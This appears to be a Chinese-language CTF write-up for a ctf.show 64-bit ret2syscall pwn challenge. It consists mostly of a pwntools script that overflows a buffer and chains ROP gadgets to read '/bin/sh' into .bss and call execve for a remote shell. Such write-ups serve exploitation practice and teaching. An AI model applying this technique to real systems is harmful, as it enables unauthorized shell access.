# 挑战简介
补发：64位ret2syscall

# 思路
64位和32位区别最大的也就是调用的寄存器了，以及大端序小端序什么的  

弄几个地址过来便行了，强调一遍，ctrl+s可以查看所有段，.bss段开始的地址便是了  

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='amd64', log_level='debug')

p = remote("pwn.challenge.ctf.show",28290)
elf = ELF('D:\edge 下载\pwn')

offset = 0x50+0x8

pop_rax = 0x46b9f8

pop_rdi = 0x4016c3

pop_rsi = 0x4017d7

pop_rdx = 0x4377d5

ret = 0x45bac5

bss = 0x6c1c40

bin_sh = b'/bin/sh\x00'

payload = b'a' * offset + p64(pop_rax) + p64(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx) + p64(0x10)
payload += p64(ret)

payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(ret)

p.sendline(payload)
p.sendline(bin_sh)

p.interactive()

```
